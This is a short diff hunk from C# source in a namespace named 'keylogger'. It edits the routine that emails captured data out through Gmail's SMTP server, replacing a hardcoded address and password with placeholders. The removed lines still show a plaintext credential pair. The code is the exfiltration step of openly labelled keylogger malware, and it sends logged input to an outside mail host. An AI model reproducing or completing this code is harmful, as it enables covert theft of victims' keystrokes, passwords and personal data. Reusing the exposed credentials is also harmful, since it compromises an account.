@@ -117,13 +117,13 @@ namespace keylogger
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage mailMessage = new MailMessage();
 
-            mailMessage.From = new MailAddress("johnytesteur1@gmail.com");
-            mailMessage.To.Add("johnytesteur1@gmail.com");
+            mailMessage.From = new MailAddress("yourmail@gmail.com");
+            mailMessage.To.Add("yourmail@gmail.com");
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             // True cause anything that gmail uses comes as encrypted msg
             client.EnableSsl = true;
-            client.Credentials = new System.Net.NetworkCredential("johnytesteur1@gmail.com", "Johny123!!");
+            client.Credentials = new System.Net.NetworkCredential("yourmail@gmail.com", "yourpassword123");
             mailMessage.Body = emailBody;
 
             client.Send(mailMessage);
